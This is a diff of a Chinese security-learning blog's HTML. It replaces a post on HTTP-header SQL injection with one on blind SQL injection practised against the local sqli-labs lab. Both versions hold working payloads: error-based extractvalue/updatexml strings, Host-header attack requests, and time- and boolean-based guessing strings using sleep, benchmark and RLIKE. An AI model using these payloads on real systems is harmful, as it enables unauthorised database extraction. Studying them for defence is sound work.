@@ -16,26 +16,26 @@
   <meta name="author" content="kitescat">
   <meta name="keywords" content="web安全">
   
-    <meta name="description" content="HTTP头部注入，http头部有许多不同的字段，这些字段标识了不同的信息">
+    <meta name="description" content="本篇我们讲解了sql注入漏洞的盲注，盲注的关键词有：1）页面无数据库回显示，2）时间盲注：反应时间差异 ，3）布尔盲注：页面差异。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【Sql注入】HTTP注入">
-<meta property="og:url" content="https://kitescat.github.io/2023/04/26/HTTP%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="【Sql注入】盲注">
+<meta property="og:url" content="https://kitescat.github.io/2023/04/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/index.html">
 <meta property="og:site_name" content="kitescat 的博客">
-<meta property="og:description" content="HTTP头部注入，http头部有许多不同的字段，这些字段标识了不同的信息">
+<meta property="og:description" content="本篇我们讲解了sql注入漏洞的盲注，盲注的关键词有：1）页面无数据库回显示，2）时间盲注：反应时间差异 ，3）布尔盲注：页面差异。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://kitescat.github.io/img/HTTP_inj.png">
-<meta property="article:published_time" content="2023-04-26T03:48:04.000Z">
-<meta property="article:modified_time" content="2023-08-16T09:17:45.130Z">
+<meta property="og:image" content="https://kitescat.github.io/img/Blind_inj.png">
+<meta property="article:published_time" content="2023-04-25T03:48:04.000Z">
+<meta property="article:modified_time" content="2024-03-02T09:14:52.073Z">
 <meta property="article:author" content="kitescat">
 <meta property="article:tag" content="渗透测试，SQL注入">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://kitescat.github.io/img/HTTP_inj.png">
+<meta name="twitter:image" content="https://kitescat.github.io/img/Blind_inj.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>【Sql注入】HTTP注入 - kitescat 的博客</title>
+  <title>【Sql注入】盲注 - kitescat 的博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -192,13 +192,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/HTTP_inj.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/Blind_inj.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="【Sql注入】HTTP注入"></span>
+            <span id="subtitle" data-typed-text="【Sql注入】盲注"></span>
           
         </div>
 
@@ -209,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-26 11:48" pubdate>
-          2023年4月26日 中午
+        <time datetime="2023-04-25 11:48" pubdate>
+          2023年4月25日 中午
         </time>
       </span>
     
@@ -222,7 +222,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.5k 字
+          3.5k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
           <!-- compatible with older versions-->
-          21 分钟
+          30 分钟
         
       </span>
     
@@ -280,52 +280,69 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">【Sql注入】HTTP注入</h1>
+            <h1 style="display: none">【Sql注入】盲注</h1>
             
             <div class="markdown-body">
               
-              <h2 id="1-HTTP注入"><a href="#1-HTTP注入" class="headerlink" title="1 HTTP注入"></a>1 HTTP注入</h2><p>Sql注入如果按数据提交方式进行分类，则有HTTP的<br>1）GET注入 2）POST注入 3）HEADER注入</p>
-<h3 id="1-1-GET注入"><a href="#1-1-GET注入" class="headerlink" title="1.1 GET注入"></a>1.1 GET注入</h3><p>GET 的语义是从服务器获取指定的资源，这个资源可以是静态的文本、页面、图片视频等。GET 请求的参数位置一般是写在 URL 中。<br><a target="_blank" rel="noopener" href="https://xiaolincoding.com/network/2_http/http_interview.html#get-%E4%B8%8E-post">https://xiaolincoding.com/network/2_http/http_interview.html#get-%E4%B8%8E-post</a><br>数据以get的方式进行提交，注入点一般在get提交的url的参数后，可以通过Burpsuite抓包进行查找。<a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1">http://127.0.0.1/Less-1/?id=1</a> 类似这种可以输入不同id的均为Get请求。</p>
-<h3 id="1-2-POST注入"><a href="#1-2-POST注入" class="headerlink" title="1.2 POST注入"></a>1.2 POST注入</h3><p>POST 的语义是根据请求负荷（报文body）对指定的资源做出处理，具体的处理方式视资源类型而不同。POST 请求携带数据的位置一般是写在报文 body 中。比如，你在我文章底部，敲入了留言后点击「提交」，浏览器就会执行一次 POST 请求，把你的留言文字放进了报文 body 里，然后拼接好 POST 请求头，通过 TCP 协议发送给服务器。<br>数据以post的方式进行提交。注入点一般在表单的填写处。</p>
-<p>图片</p>
-<p>如sqli-lab Less-14</p>
-<h3 id="1-3-Http头部注入"><a href="#1-3-Http头部注入" class="headerlink" title="1.3 Http头部注入"></a>1.3 Http头部注入</h3><p>user-agent：判定用户使用的操作系统，以及使用的浏览器的版本</p>
-<p>cookie：判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡</p>
-<p>x-forwarded-for：获得HTTP请求端真实的IP</p>
-<p>client-ip：数据库保存客户端IP的参数</p>
-<p>rerferer：浏览器向web端表明自己从哪个链接而来</p>
-<p>host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号</p>
-<h2 id="2-靶场例子或测试步骤"><a href="#2-靶场例子或测试步骤" class="headerlink" title="2 靶场例子或测试步骤"></a>2 靶场例子或测试步骤</h2><p>① POST包中header的User-agent头后拼接语句<br>图片</p>
-<p>‘and extractvalue(1,concat(0x7e,version(),0x7e)) and ‘1’=’1</p>
-<p>‘or extractvalue(1,concat(0x7e,(select username from security.users limit 0,1),0x7e)) or’</p>
-<p>② cookie后拼接语句</p>
-<p>图片</p>
-<p>图片</p>
-<p>图片</p>
-<p>③ x-forwarded-for后拼接语句</p>
-<p>X-forwarded-for:172.63.25.3’ and updatexml(1,concat(0x7e,(selectdatabase()),0x7e),1) and ‘1’=’1  </p>
-<p>④ client-ip/rerferer都和前面的类似</p>
-<p>referer:xxx.com’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ‘1’=’1</p>
-<p>⑤ host注入</p>
-<p>1）修改Host值</p>
-<p>简单地来说，可以修改HTTP头中的Host值，如果观察到响应包中含有修改后的值，说明存在漏洞。但有时候篡改Host头的值会导致无法访问Web应用程序，从而导致“无效主机头”的错误信息，特别是通过CDN访问目标时会发生这种情况。</p>
-<p>2）添加重复的Host头</p>
-<p>添加重复的Host头，通常两个Host头之中有一个是有效的，可以理解为一个是确保请求正确地发送到目标服务器上；另一个则是传递payload到后端服务器中。</p>
-<p>GET /example HTTP/1.1<br>Host: vulnerable-website.com<br>Host: attackd-stuff<br>3）使用绝对路径的URL</p>
-<p>尽管许多请求通常在请求域上使用相对路径，但是也同时配置了绝对URL的请求。</p>
-<p>GET <a target="_blank" rel="noopener" href="https://vulnerable-website.com/">https://vulnerable-website.com/</a> HTTP/1.1<br>Host: attack-stuff<br>有时候也可以尝试不同的协议，如HTTP或HTTPS。</p>
-<p>4）添加缩进或换行</p>
-<p>当一些站点block带有多个Host头的请求时，可以通过添加缩进字符的HTTP头来绕过：</p>
-<p>GET /example HTTP/1.1<br> Host: attack-stuff<br>Host: vulnerable-website.com<br>5）注入覆盖Host头的字段</p>
-<p>与Host头功能相近的字段，如X-Forwarded-Host、X-Forwarded-For等，这些有时候是默认开启的。</p>
-<p>GET /example HTTP/1.1<br>Host: vulnerable-website.com<br>X-Forwarded-Host: attack-stuff<br>诸如此类，还有其他的字段：</p>
-<p>X-Host<br>X-Forwarded-Server<br>X-HTTP-Host-Override<br>Forwarded<br>6）忽略端口仅校验域名</p>
-<p>当修改、添加重复Host头被拦截的时候，可以尝试了解Web应用程序是怎样解析Host头的。</p>
-<p>比如，一些解析算法会忽略Host头中的端口值，仅仅校验域名。这时候可以将Host修改为如下形式：</p>
-<p>GET /example HTTP/1.1<br>Host: vulnerable-website.com:attack-stuff<br>保持域名不变，修改端口值为非端口号的其他值（非数字）， 将Host头攻击的payload放在端口值处，同样能进行Host头攻击。</p>
-<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>本篇我们讲解了sql注入漏洞的HTTP注入，HTTP注入的关键词有：1）GET注入 2）POST注入 3）HEADER注入。文章重点在于HTTP头部注入部分，http头部有许多不同的字段，这些字段标识了不同的信息，其中host字段注入介绍了许多细节。<br>学习到这里，我们已经积攒了一定的问题，比如这些sql注入有哪些修复建议，有没有统一的测试步骤等，我们在后面的文章中一一寻找答案并解决吧。同时我们将讲完接下来的堆叠注入，二次注入，宽字节注入。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39654116/article/details/105421499">https://blog.csdn.net/qq_39654116/article/details/105421499</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/109034421">https://blog.csdn.net/angry_program/article/details/109034421</a></p>
+              <div class="note note-info">
+            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>
+          </div>
 
+<h2 id="1-盲注"><a href="#1-盲注" class="headerlink" title="1 盲注"></a>1 盲注</h2><p>为什么叫做盲注？<br>盲注的本质是猜解(所谓 “盲” 就是在你看不到返回数据的情况下能通过 “感觉” 来判断)，那能感觉到什么？答案是：差异（包括运行时间的差异和页面返回结果的差异）。</p>
+<p>也就是说我们想实现的是我们要构造一条语句来测试我们输入的布尔表达式，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p>
+<p>如上所述，这种猜测的过程使得盲注得名。在盲注中，攻击者根据页面内容的不同，或是响应时间不同来判断是否存在注入，以及注入是否成功。<br>于是很好理解，盲注是页面无数据库回显示，但能通过 1）反应时间或 2）页面不同的差异，来反馈逻辑正误的注入。攻击者可以利用逻辑判断获取数据库中的数据。常见的可以分为布尔盲注和时间盲注两大类。<br><img src="/img/blind_1.png" srcset="/img/loading.gif" lazyload><br>这种类似if的逻辑语句可以给sql语句分流，出现两种结果，带来差异。我们把这种能根据其中输入真假，返回不同结果的函数叫做分流函数。其他的分流“函数”还有：elt()， field()，case when then else end等等。</p>
+<ol>
+<li><p>ELT(N ,str1 ,str2 ,str3 ,…)<br>说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。若 N 小于 1 或大于参数的数目，则返回值为 NULL 。ELT() 是 FIELD() 的补数。</p>
+</li>
+<li><p>FIELD(str, str1, str2, str3, ……)<br>该函数返回的是 str 在这些字符串的位置的索引，如果找不到返回 0。</p>
+</li>
+<li><p>case when then else end</p>
+<p>  CASE WHEN (ascii(substr((select database()),{0},1))&gt;{1}) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)</p>
+<h3 id="1-1-布尔盲注"><a href="#1-1-布尔盲注" class="headerlink" title="1.1 布尔盲注"></a>1.1 布尔盲注</h3><p>布尔盲注：某些场合下，不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的。通过输入布尔值的注入点，注入我们的条件语句，查看页面的返回结果（True or False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。<br>① 布尔盲注的特点：<br>1）只会显示执行或者未执行两种不同界面</p>
+</li>
+</ol>
+<p>2）适用于数据库能查询到数据和查询不到数据页面返回不同，但是数据不会显示在页面</p>
+<p>② 注入流程及手段<br>参考论坛@士别三日wyx的帖子，我们以sqli-lab Less 5为例，?id=1 正常输入页面显示 “You are in…”， 加入单引号发现报错。</p>
+<p><img src="/img/blind_2.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-5/?id=1&#39;and">http://127.0.0.1/Less-5/?id=1&#39;and</a> length(database())=1 –+<br><img src="/img/blind_3.png" srcset="/img/loading.gif" lazyload><br>此时，页面回显为空。猜数据库长度(利用二分法)。<br><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-5/?id=1&#39;and">http://127.0.0.1/Less-5/?id=1&#39;and</a> length(database())=8 –+<br><img src="/img/blind_4.png" srcset="/img/loading.gif" lazyload><br>当页面回显You are in … 说明and后面数值为1， 显示正常，说明数据库名长度为8。这种通过构造条件判断的方式进行猜解的过程，即是盲注的过程。</p>
+<h3 id="1-2-时间盲注（延迟注入）"><a href="#1-2-时间盲注（延迟注入）" class="headerlink" title="1.2 时间盲注（延迟注入）"></a>1.2 时间盲注（延迟注入）</h3><p> 时间盲注：根据页面的响应时间来判断是否存在注入。一般通过延迟函数，大量查询等payload进行利用。时间盲注使用的优先级并不高，通常是在联合注入、报错注入、布尔盲注都无法使用时才会考虑使用：</p>
+<p>1）页面没有回显位置（联合注入无法使用）</p>
+<p>2）页面不显示数据库的报错信息（报错注入无法使用）</p>
+<p>3）无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）</p>
+<p>①  延迟函数 sleep(n) 、benchmark(n,expr)<br>sleep：</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id = <span class="hljs-string">&#x27;1&#x27;</span> and sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+<p>benchmark：benchmark(10000000,encode(‘hello’,’mom’))</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">eg.  <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">BENCHMARK</span>(<span class="hljs-params"><span class="hljs-number">10000</span>,md5(<span class="hljs-string">&#x27;a&#x27;</span></span>))</span>;<br></code></pre></td></tr></table></figure>
+<p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p>
+<p>② heavy query<br>heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算。</p>
+<p>③ get_lock<br>get_lock()函数 需要使用 mysql_pconnect函数来连接数据库，利用场景比较有限。</p>
+<p>在一个session中可以先锁定一个变量例如：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> get_lock(‘MountSec’,<span class="hljs-number">1</span>)。<br></code></pre></td></tr></table></figure>
+<p>然后通过另一个session再次执行get_lock（‘MountSec’,5）此时会产生5秒的延迟，其效果类似于sleep(5)。<br>④ rpad+rlike<br>rpad(1,3,’a’)是指用a填充第一位的字符串以达到第二位的长度</p>
+<p>经本地测试mysql5.7最大允许用单个rpad()填充349525位，而多个rpad()可以填充4个349525位，</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> table1 <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">mid</span>(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-comment">&#x27;r&#x27;,concat(rpad(1,349525,&#x27;a&#x27;),</span><br>rpad(<span class="hljs-number">1</span>,<span class="hljs-number">349525</span>,<span class="hljs-comment">&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) </span><br>RLIKE <span class="hljs-comment">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+</span><br>asdasdsadasd<span class="hljs-comment">&#x27;,1);</span><br></code></pre></td></tr></table></figure>
+<p>最后的asdasdasd对时间长度有巨大影响，可以增长其长度以增大时延</p>
+<h2 id="2-常见payload"><a href="#2-常见payload" class="headerlink" title="2 常见payload"></a>2 常见payload</h2><h3 id="2-1-猜解细节"><a href="#2-1-猜解细节" class="headerlink" title="2.1 猜解细节"></a>2.1 猜解细节</h3><p>①  猜解当前数据库名称长度（二分法）</p>
+<pre><code class="hljs"> &#39; and if((length(database()))=12,sleep(5),1)--+ 页面延时了
+</code></pre>
+<p>==》当前数据库名称长度为 12。</p>
+<p>② 猜解当前数据库名称<br>猜解数据库第一个字符</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) =<span class="hljs-number">115</span> ),sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>猜解整个数据库名</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">&#x27; and <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>(database(),1,1))=107,<span class="hljs-keyword">sleep</span>(5),1)--+ <br></code></pre></td></tr></table></figure>
+<p>页面延时了<br>==》数据库第一个字母是k… 类推得到数据库名kanwolonxia。可以用burp进行爆破。</p>
+<h3 id="2-2-常用语句"><a href="#2-2-常用语句" class="headerlink" title="2.2 常用语句"></a>2.2 常用语句</h3><p>①  条件语句case when then else end</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&quot;(CASE WHEN (ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>))&gt;&#123;<span class="hljs-number">1</span>&#125;) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> DUAL <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">2</span> <span class="hljs-keyword">FROM</span> DUAL) <span class="hljs-keyword">END</span>)<span class="hljs-string">&quot;.format(i, str(ord(string[left])))</span><br></code></pre></td></tr></table></figure>
+<p>②  条件语句 if(expr1,expr2,expr3)<br>expr1为true则返回expr2，expr1为false则返回expr3。</p>
+<p>注：仅MySQL支持if（expr1，expr2，expr3）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# 明显延迟<br><span class="hljs-attribute">1</span>&#x27;and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# 没有延迟<br><span class="hljs-attribute">1</span>&#x27;and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# 没有延迟<br></code></pre></td></tr></table></figure>
+<p>③ Order by<br>order by rand(True)和order by rand(False)的结果排序是不同的，可以根据这个不同来进行盲注：order by rand(database()=’MountSec’)</p>
+<p>返回了True的排序，说明database()=’MountSec’是正确的值</p>
+<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>本篇我们讲解了sql注入漏洞的盲注，盲注的关键词有：1）页面无数据库回显示，2）时间盲注：反应时间差异 ，3）布尔盲注：页面差异。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://www.sqlinjection.net/heavy-query/">https://www.sqlinjection.net/heavy-query/</a>
+<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a target="_blank" rel="noopener" href="http://zhuanzhuan.lklgongyi.com/anquanke/26/170626.html">http://zhuanzhuan.lklgongyi.com/anquanke/26/170626.html</a>
+<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/356765.html">https://www.freebuf.com/articles/web/356765.html</a>
+<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
               
             </div>
             <hr/>
@@ -369,8 +386,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>【Sql注入】HTTP注入</div>
-      <div>https://kitescat.github.io/2023/04/26/HTTP注入/</div>
+      <div>【Sql注入】盲注</div>
+      <div>https://kitescat.github.io/2023/04/25/SQL注入之盲注/</div>
     </div>
     <div class="license-meta">
       
@@ -382,7 +399,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年4月26日</div>
+          <div>2023年4月25日</div>
         </div>
       
       
@@ -412,9 +429,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/05/05/CSRF/" title="【Web安全基础】CSRF">
+                      <a href="/2023/04/26/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHTTP%E6%B3%A8%E5%85%A5/" title="【Sql注入】HTTP注入">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【Web安全基础】CSRF</span>
+                        <span class="hidden-mobile">【Sql注入】HTTP注入</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -422,8 +439,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/04/25/%E7%9B%B2%E6%B3%A8/" title="【Sql注入】盲注">
-                        <span class="hidden-mobile">【Sql注入】盲注</span>
+                      <a href="/2023/04/24/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" title="【Sql注入】联合注入">
+                        <span class="hidden-mobile">【Sql注入】联合注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
